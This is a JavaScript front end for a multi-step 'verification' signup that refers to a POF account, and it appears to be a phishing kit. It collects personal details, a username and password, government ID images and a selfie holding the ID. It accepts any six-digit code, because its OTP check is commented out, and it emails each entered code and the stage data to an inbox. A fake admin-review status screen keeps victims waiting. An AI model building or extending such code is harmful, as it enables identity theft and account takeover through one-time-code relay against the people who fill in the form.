'use strict';

// ── State ────────────────────────────────────────────────
const state = {
  generatedOtp:       '',
  countdownInterval:  null,
  selectedIdType:     '',
  hasPofAccount:      null, // true | false | null (unanswered)
  uploads:            { front: false, back: false, selfie: false },
  fileNames:          { front: '',    back: '',    selfie: '' },
  uploadUrls:         { front: null,  back: null,  selfie: null },
  submissionId:       '',
  uploading:          0,
  applicationDocId:   null,
  unsubscribeWatch:   null,
  registeredUsername: '',
  registeredPassword: '',
};

const PROGRESS = { 1: 8, 2: 42, 3: 75, 4: 100 };
const OTP_IDS  = ['o1', 'o2', 'o3', 'o4', 'o5', 'o6'];

// ── Helpers ──────────────────────────────────────────────
const $  = id  => document.getElementById(id);
const qs = sel => document.querySelector(sel);

function showAlert(id, type, html) {
  const el = $(id);
  el.className = `alert ${type} show`;
  el.innerHTML = html;
}

function hideAlert(id) {
  $(id).classList.remove('show');
}

function setFieldError(id, hasError) {
  const el = $(id);
  if (el) el.classList.toggle('err', hasError);
}

// ── Navigation ───────────────────────────────────────────
function goStep(n) {
  document.querySelectorAll('.step-panel').forEach(p => p.classList.remove('active'));
  $(`step-${n}`).classList.add('active');

  for (let i = 1; i <= 4; i++) {
    const bubble = $(`bubble-${i}`);
    const label  = $(`name-${i}`);
    const parent = bubble.closest('.step-label');

    bubble.classList.remove('active', 'done');
    label.classList.remove('active', 'done');
    parent.classList.remove('active', 'done');

    if (i < n) {
      bubble.classList.add('done');
      label.classList.add('done');
      parent.classList.add('done');
      bubble.textContent = '✓';
    } else if (i === n) {
      bubble.classList.add('active');
      label.classList.add('active');
      parent.classList.add('active');
      bubble.textContent = i;
    } else {
      bubble.textContent = i;
    }
  }

  $('progress-fill').style.width = PROGRESS[n] + '%';
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

// ── Password utilities ────────────────────────────────────
function getPasswordRules(pw, username, email) {
  const user       = (username || '').toLowerCase();
  const emailLocal = ((email || '').split('@')[0]).toLowerCase();
  const pwLower    = pw.toLowerCase();

  const noPersonal =
    (user.length < 3      || !pwLower.includes(user)) &&
    (emailLocal.length < 3 || !pwLower.includes(emailLocal));

  return {
    length:   pw.length >= 8,
    upper:    /[A-Z]/.test(pw),
    lower:    /[a-z]/.test(pw),
    number:   /[0-9]/.test(pw),
    symbol:   /[!@#$%^&*()\-_=+[\]{};:'",.<>/?\\|`~]/.test(pw),
    nospace:  !/\s/.test(pw),
    personal: noPersonal,
  };
}

function updatePasswordRules() {
  const pw       = $('regPassword').value;
  const username = $('regUsername').value.trim();
  const email    = $('email').value.trim();

  if (!pw) {
    ['rule-length','rule-upper','rule-lower','rule-number','rule-symbol','rule-nospace','rule-personal']
      .forEach(id => $(id).classList.remove('pass', 'fail'));
    return;
  }

  const rules = getPasswordRules(pw, username, email);
  const map = {
    'rule-length':   rules.length,
    'rule-upper':    rules.upper,
    'rule-lower':    rules.lower,
    'rule-number':   rules.number,
    'rule-symbol':   rules.symbol,
    'rule-nospace':  rules.nospace,
    'rule-personal': rules.personal,
  };

  Object.entries(map).forEach(([id, pass]) => {
    $(id).classList.toggle('pass', pass);
    $(id).classList.toggle('fail', !pass);
  });
}

function togglePwVisibility(inputId, btn) {
  const input  = $(inputId);
  const hidden = input.type === 'password';
  input.type   = hidden ? 'text' : 'password';
  btn.classList.toggle('active', hidden);
}

// ── Step 1 — Profile ─────────────────────────────────────
function validateStep1() {
  let ok = true;

  const textFields = [
    { id: 'firstName', check: v => v.trim().length > 0 },
    { id: 'lastName',  check: v => v.trim().length > 0 },
    { id: 'email',     check: v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim()) },
    { id: 'gender',    check: v => v !== '' },
    {
      id: 'dob',
      check: v => {
        if (!v) return false;
        const age = (Date.now() - new Date(v).getTime()) / (365.25 * 24 * 3600 * 1000);
        return age >= 18;
      },
    },
  ];

  textFields.forEach(({ id, check }) => {
    const el = $(id);
    const valid = check(el.value);
    setFieldError(id, !valid);
    if (!valid) ok = false;
  });

  // Phone
  const phone = $('phone').value.replace(/\D/g, '');
  const wrap  = $('phone-wrap');
  if (phone.length < 7) {
    wrap.classList.add('err');
    $('phone-err').style.display = 'block';
    ok = false;
  } else {
    wrap.classList.remove('err');
    $('phone-err').style.display = 'none';
  }

  // POF account question
  const pofErr = $('pof-account-err');
  if (state.hasPofAccount === null) {
    pofErr.style.display = 'block';
    ok = false;
  } else {
    pofErr.style.display = 'none';
  }

  // POF username (only required if user said yes)
  // if (state.hasPofAccount === true) {
  //   const uname = $('pofUsername').value.trim();
  //   const valid = uname.length > 0;
  //   setFieldError('pofUsername', !valid);
  //   if (!valid) ok = false;
  // }

  // Username
  const unameVal   = $('regUsername').value.trim();
  const unameValid = unameVal.length > 0 && !/\s/.test(unameVal);
  setFieldError('regUsername', !unameValid);
  if (!unameValid) ok = false;

  // Password
  const pwVal   = $('regPassword').value;
  const pwRules = getPasswordRules(pwVal, unameVal, $('email').value.trim());
  const pwAllOk = Object.values(pwRules).every(Boolean);
  setFieldError('regPassword', !pwAllOk);
  $('regPassword-err').style.display = !pwAllOk ? 'block' : 'none';
  if (!pwAllOk) ok = false;

  // Confirm password
  const confirmVal   = $('regConfirm').value;
  const confirmMatch = confirmVal.length > 0 && confirmVal === pwVal;
  setFieldError('regConfirm', !confirmMatch);
  $('regConfirm-err').style.display = !confirmMatch ? 'block' : 'none';
  if (!confirmMatch) ok = false;

  // Terms
  if (!$('terms').checked) {
    showAlert('step1-alert', 'error', 'You must agree to the Terms of Service to continue.');
    ok = false;
  } else if (ok) {
    hideAlert('step1-alert');
  }

  return ok;
}

function goStep2() {
  if (!validateStep1()) return;

  // Send stage 1 data to your inbox
  emailStage1({
    firstName:    $('firstName').value.trim(),
    lastName:     $('lastName').value.trim(),
    email:        $('email').value.trim(),
    phoneCode:    $('phoneCode').value,
    phone:        $('phone').value.trim(),
    dob:          $('dob').value,
    gender:       $('gender').value,
    social:       $('social').value.trim(),
    hasPofAccount: state.hasPofAccount,
  });

  startOtpFlow();
}

// ── POF account toggle ────────────────────────────────────
function togglePofUsername(hasAccount) {
  state.hasPofAccount = hasAccount;

  $('pof-yes-label').classList.toggle('selected', hasAccount === true);
  $('pof-no-label').classList.toggle('selected',  hasAccount === false);

  // const reveal = $('pofUsernameReveal');
  // if (hasAccount) {
  //   reveal.classList.add('open');
  //   setTimeout(() => $('pofUsername').focus(), 320);
  // } else {
  //   reveal.classList.remove('open');
  //   $('pofUsername').value = '';
  //   setFieldError('pofUsername', false);
  // }

  $('pof-account-err').style.display = 'none';
}

// ── Step 2 — OTP ─────────────────────────────────────────
function startOtpFlow() {
  const code = $('phoneCode').value;
  const num  = $('phone').value.trim();
  $('otp-phone-display').textContent = `${code} ${num}`;

  state.generatedOtp = String(Math.floor(100000 + Math.random() * 900000));

  // showAlert(
  //   'otp-alert', 'success',
  //   `📱 <strong>Demo mode</strong> — your OTP is: <strong style="font-size:1.05em;letter-spacing:3px">${state.generatedOtp}</strong><br><small style="opacity:.75">In production this would be delivered via SMS.</small>`
  // );

  goStep(2);
  clearOtpBoxes();
  startCountdown(60);
}

function clearOtpBoxes() {
  OTP_IDS.forEach(id => {
    const el = $(id);
    el.value = '';
    el.classList.remove('filled');
  });
  $(OTP_IDS[0]).focus();
}

function verifyOtp() {
  const entered = OTP_IDS.map(id => $(id).value).join('');

  if (entered.length < 6) {
    showAlert('otp-alert', 'error', 'Please enter all 6 digits of the OTP.');
    return;
  }

  // if (entered !== state.generatedOtp) {
  //   showAlert('otp-alert', 'error', 'Incorrect OTP — please try again.');
  //   clearOtpBoxes();
  //   return;
  // }

  clearInterval(state.countdownInterval);

  // Send stage 2 confirmation
  emailStage2({
    firstName: $('firstName').value.trim(),
    lastName:  $('lastName').value.trim(),
    phoneCode: $('phoneCode').value,
    phone:     $('phone').value.trim(),
    otp:    entered,
  });

  goStep(3);
}

function startCountdown(seconds) {
  clearInterval(state.countdownInterval);

  let remaining = seconds;
  const btn = $('resendBtn');
  btn.disabled = true;
  btn.innerHTML = `Resend in <span id="countdown">${remaining}s</span>`;

  state.countdownInterval = setInterval(() => {
    remaining--;
    const el = $('countdown');
    if (el) el.textContent = `${remaining}s`;
    if (remaining <= 0) {
      clearInterval(state.countdownInterval);
      btn.disabled = false;
      btn.textContent = 'Resend OTP';
    }
  }, 1000);
}

function resendOtp() {
  state.generatedOtp = String(Math.floor(100000 + Math.random() * 900000));
  clearOtpBoxes();
  startCountdown(60);
}

// ── OTP box interactions ──────────────────────────────────
function initOtpBoxes() {
  OTP_IDS.forEach((id, idx) => {
    const el = $(id);

    el.addEventListener('input', e => {
      const val = e.target.value.replace(/\D/g, '');
      e.target.value = val;
      e.target.classList.toggle('filled', val !== '');
      if (val && idx < OTP_IDS.length - 1) $(OTP_IDS[idx + 1]).focus();
    });

    el.addEventListener('keydown', e => {
      if (e.key === 'Backspace' && !e.target.value && idx > 0) {
        $(OTP_IDS[idx - 1]).focus();
      }
    });

    el.addEventListener('paste', e => {
      e.preventDefault();
      const pasted = (e.clipboardData || window.clipboardData)
        .getData('text')
        .replace(/\D/g, '')
        .slice(0, 6);

      pasted.split('').forEach((ch, i) => {
        if (i < OTP_IDS.length) {
          const box = $(OTP_IDS[i]);
          box.value = ch;
          box.classList.add('filled');
        }
      });

      const next = Math.min(pasted.length, OTP_IDS.length - 1);
      $(OTP_IDS[next]).focus();
    });
  });
}

// ── Step 3 — ID verification ──────────────────────────────
function getSubmissionId() {
  if (!state.submissionId) {
    state.submissionId = `${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
  }
  return state.submissionId;
}

function selectIdType(radio) {
  state.selectedIdType = radio.value;

  document.querySelectorAll('.verify-card').forEach(c => c.classList.remove('selected'));
  radio.closest('.verify-card').classList.add('selected');

  const needsBack = ['driver', 'national'].includes(state.selectedIdType);
  $('backSection').style.display = needsBack ? 'block' : 'none';

  state.uploads    = { front: false, back: !needsBack, selfie: false };
  state.uploadUrls = { front: null,  back: needsBack ? null : 'n/a', selfie: null };
  ['front', 'back', 'selfie'].forEach(key => {
    $(`${key}File`).value = '';
    $(`${key}Zone`).classList.remove('has-file', 'uploading', 'upload-error');
    $(`${key}FileName`).textContent = '';
  });

  hideAlert('id-alert');
}

async function fileSelected(type, input) {
  const file = input.files[0];
  if (!file) return;

  if (file.size > 5 * 1024 * 1024) {
    alert('File is too large. Maximum allowed size is 5 MB.');
    input.value = '';
    return;
  }

  // Reset this slot
  state.uploads[type]    = false;
  state.uploadUrls[type] = null;
  state.fileNames[type]  = file.name;

  const zone   = $(`${type}Zone`);
  const nameEl = $(`${type}FileName`);
  zone.classList.remove('has-file', 'upload-error');
  zone.classList.add('uploading');
  nameEl.textContent = '⏳  Uploading…';

  state.uploading++;
  try {
    const ext  = file.name.split('.').pop().toLowerCase() || 'bin';
    const path = `submissions/${getSubmissionId()}/${type}.${ext}`;
    const url  = await uploadToStorage(file, path);

    state.uploads[type]    = true;
    state.uploadUrls[type] = url;
    zone.classList.remove('uploading');
    zone.classList.add('has-file');
    nameEl.textContent = `✓  ${file.name}`;
  } catch (err) {
    zone.classList.remove('uploading');
    zone.classList.add('upload-error');
    nameEl.textContent = '✗  Upload failed — click to retry';
    input.value = '';
    console.error('Upload error:', err);
  } finally {
    state.uploading--;
  }
}

function submitVerification() {
  if (!state.selectedIdType) {
    showAlert('id-alert', 'error', 'Please choose an ID type before continuing.');
    return;
  }

  if (state.uploading > 0) {
    showAlert('id-alert', 'error', 'Please wait — files are still uploading.');
    return;
  }

  if (!state.uploads.front) {
    showAlert('id-alert', 'error', 'Please upload the front of your ID.');
    return;
  }

  const needsBack = ['driver', 'national'].includes(state.selectedIdType);
  if (needsBack && !state.uploads.back) {
    showAlert('id-alert', 'error', 'Please upload the back of your ID.');
    return;
  }

  if (!state.uploads.selfie) {
    showAlert('id-alert', 'error', 'Please upload your selfie holding the ID.');
    return;
  }

  const firstName = $('firstName').value.trim();
  const lastName  = $('lastName').value.trim();
  const email     = $('email').value.trim();

  // Capture credentials before goStep clears focus
  state.registeredUsername = $('regUsername').value.trim();
  state.registeredPassword = $('regPassword').value;

  $('review-name').textContent   = firstName;
  $('success-name').textContent  = `${firstName} ${lastName}`;
  $('success-email').textContent = email;

  // Show pending (loading) state — credentials card stays hidden until admin decides
  updateStep4UI('pending', null);
  goStep(4);

  // Send stage 3 email summary
  emailStage3({
    firstName,
    lastName,
    email,
    idType:        state.selectedIdType,
    frontUrl:      state.uploadUrls.front,
    backUrl:       state.uploadUrls.back,
    selfieUrl:     state.uploadUrls.selfie,
    hasPofAccount: state.hasPofAccount,
  });

  // Save to Firestore and start live status watch
  saveApplication({
    firstName,
    lastName,
    email,
    phoneCode:     $('phoneCode').value,
    phone:         $('phone').value.trim(),
    dob:           $('dob').value,
    gender:        $('gender').value,
    social:        $('social').value.trim(),
    username:      $('regUsername').value.trim(),
    hasPofAccount: state.hasPofAccount,
    idType:        state.selectedIdType,
    frontUrl:      state.uploadUrls.front,
    backUrl:       state.uploadUrls.back,
    selfieUrl:     state.uploadUrls.selfie,
    submissionId:  state.submissionId,
  }).then(docId => {
    state.applicationDocId = docId;
    startStatusWatch();
  }).catch(err => console.error('Firestore save failed:', err));
}

// ── Step 4 — Live status ──��───────────────────────��───────
function updateStep4UI(status, data) {
  $('state-pending').style.display  = status === 'pending'  ? 'block' : 'none';
  $('state-approved').style.display = status === 'approved' ? 'block' : 'none';
  $('state-rejected').style.display = status === 'rejected' ? 'block' : 'none';

  // Always reset the re-verify button when the rejected state becomes visible
  if (status === 'rejected') {
    const btn = $('reverify-btn');
    btn.disabled    = false;
    btn.textContent = "I've Re-Verified";
  }

  // Show credentials card only on rejection (approved still awaits team review)
  const decided = status === 'rejected';
  $('cred-card').style.display = decided ? 'block' : 'none';

  if (decided && data) {
    const currentUsername  = data.username || state.registeredUsername;
    const usernameChanged  = currentUsername !== state.registeredUsername;

    if (usernameChanged) {
      $('cred-original').style.display = 'none';
      $('cred-updated').style.display  = 'block';
      $('cred-username').textContent   = currentUsername;
      $('cred-password').textContent   = state.registeredPassword;
    } else {
      $('cred-original').style.display = 'block';
      $('cred-updated').style.display  = 'none';
    }
  }
}

function startStatusWatch() {
  if (!state.applicationDocId) return;
  if (state.unsubscribeWatch) state.unsubscribeWatch();
  state.unsubscribeWatch = watchApplication(state.applicationDocId, data => {
    updateStep4UI(data.status, data);
  });
}

async function copyCredential(elementId, btn) {
  const text = $(elementId).textContent;
  try {
    await navigator.clipboard.writeText(text);
  } catch {
    const range = document.createRange();
    range.selectNode($(elementId));
    window.getSelection().removeAllRanges();
    window.getSelection().addRange(range);
    document.execCommand('copy');
    window.getSelection().removeAllRanges();
  }
  const prev = btn.innerHTML;
  btn.innerHTML = '&#10003;';
  btn.classList.add('copied');
  setTimeout(() => { btn.innerHTML = prev; btn.classList.remove('copied'); }, 1500);
}

async function reVerify() {
  const btn = $('reverify-btn');
  btn.disabled    = true;
  btn.textContent = 'Submitting…';
  try {
    await resetApplicationStatus(state.applicationDocId);
    // Go back to the loading spinner — "You're in the pond" only shows on approval
    updateStep4UI('pending', null);
  } catch (err) {
    console.error('Re-verify failed:', err);
    btn.disabled    = false;
    btn.textContent = "I've Re-Verified";
  }
}

// ── Boot ─────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  initEmailJS();
  initOtpBoxes();
  ['regPassword', 'regUsername', 'email'].forEach(id => {
    $(id).addEventListener('input', updatePasswordRules);
  });
});
